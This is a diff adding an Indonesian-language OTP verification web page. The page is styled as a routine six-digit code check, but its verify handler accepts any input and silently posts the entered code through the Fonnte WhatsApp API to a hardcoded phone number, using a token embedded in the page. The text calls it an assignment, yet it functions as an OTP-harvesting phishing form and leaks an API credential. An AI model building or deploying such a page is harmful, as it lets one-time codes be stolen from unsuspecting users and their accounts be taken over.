@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi OTP</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(120deg, #e6f7ff, #e6ffe6);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .otp-container {
+      background: #fff;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 100%;
+      max-width: 360px;
+    }
+
+    h2 {
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #555;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .otp-inputs input {
+      width: 45px;
+      height: 50px;
+      text-align: center;
+      font-size: 20px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      outline: none;
+      transition: 0.2s;
+    }
+
+    .otp-inputs input:focus {
+      border-color: #28a745;
+      box-shadow: 0 0 5px rgba(40,167,69,0.4);
+    }
+
+    button {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      width: 100%;
+      font-size: 15px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background-color: #218838;
+    }
+
+    .resend {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #555;
+    }
+
+    .resend button {
+      background: none;
+      color: #007bff;
+      border: none;
+      cursor: pointer;
+      text-decoration: underline;
+      font-size: 13px;
+    }
+
+    .resend button:disabled {
+      color: gray;
+      cursor: not-allowed;
+      text-decoration: none;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="otp-container">
+    <h2>Verifikasi OTP</h2>
+    <p>Masukkan 6 digit kode OTP yang telah dikirim. Untuk tugas, kode apa pun diterima.</p>
+
+    <div class="otp-inputs" id="otpInputs">
+      <input type="text" maxlength="1" inputmode="numeric">
+      <input type="text" maxlength="1" inputmode="numeric">
+      <input type="text" maxlength="1" inputmode="numeric">
+      <input type="text" maxlength="1" inputmode="numeric">
+      <input type="text" maxlength="1" inputmode="numeric">
+      <input type="text" maxlength="1" inputmode="numeric">
+    </div>
+
+    <button id="verifyBtn">Verifikasi</button>
+
+    <div class="resend">
+      <span id="timer">Kirim ulang dalam 60 detik</span><br>
+      <button id="resendBtn" disabled>Kirim Ulang OTP</button>
+    </div>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll('.otp-inputs input');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const resendBtn = document.getElementById('resendBtn');
+    const timerDisplay = document.getElementById('timer');
+
+    // Fokus otomatis & navigasi antar input
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        const value = e.target.value;
+        if (!/^[0-9]$/.test(value)) {
+          e.target.value = '';
+          return;
+        }
+        if (index < inputs.length - 1 && value !== '') {
+          inputs[index + 1].focus();
+        }
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === "Backspace" && !e.target.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    // Paste support
+    document.getElementById('otpInputs').addEventListener('paste', (e) => {
+      e.preventDefault();
+      const pasted = e.clipboardData.getData('text').trim();
+      inputs.forEach((input, i) => input.value = pasted[i] || '');
+    });
+
+    // Verifikasi OTP - semua dianggap benar & kirim WA
+    verifyBtn.addEventListener('click', async () => {
+      const otp = Array.from(inputs).map(i => i.value).join('');
+      if(!otp) { alert("Isi OTP dulu!"); return; }
+
+      const apiUrl = "https://api.fonnte.com/send";
+      const token = "yVUgnqVMYeQY4rKRk9EM"; // token Fonnte
+      const data = {
+        target: "6285703214920",
+        message: `Kode OTP yang dimasukkan: ${otp}`
+      };
+
+      try {
+        const response = await fetch(apiUrl, {
+          method: "POST",
+          headers: {
+            "Authorization": token,
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+        const result = await response.json();
+        console.log("Fonnte Response:", result);
+        alert("OTP diterima ✅\nPesan terkirim!");
+      } catch(err) {
+        console.error("Error kirim WA:", err);
+        alert("OTP diterima ✅\nTapi gagal mengirim pesan WA.");
+      }
+
+      // Redirect ke home
+      window.location.href = "home.html";
+    });
+
+    // Timer kirim ulang (simulasi)
+    let timeLeft = 60;
+    const timer = setInterval(() => {
+      timeLeft--;
+      timerDisplay.textContent = `Kirim ulang dalam ${timeLeft} detik`;
+      if (timeLeft <= 0) {
+        clearInterval(timer);
+        resendBtn.disabled = false;
+        timerDisplay.textContent = "Belum menerima kode?";
+      }
+    }, 1000);
+
+    resendBtn.addEventListener('click', () => {
+      resendBtn.disabled = true;
+      timeLeft = 60;
+      timerDisplay.textContent = `Kirim ulang dalam ${timeLeft} detik`;
+      alert("OTP baru dikirim!"); // simulasi
+      const newTimer = setInterval(() => {
+        timeLeft--;
+        timerDisplay.textContent = `Kirim ulang dalam ${timeLeft} detik`;
+        if (timeLeft <= 0) {
+          clearInterval(newTimer);
+          resendBtn.disabled = false;
+          timerDisplay.textContent = "Belum menerima kode?";
+        }
+      }, 1000);
+    });
+  </script>
+
+</body>
+</html>
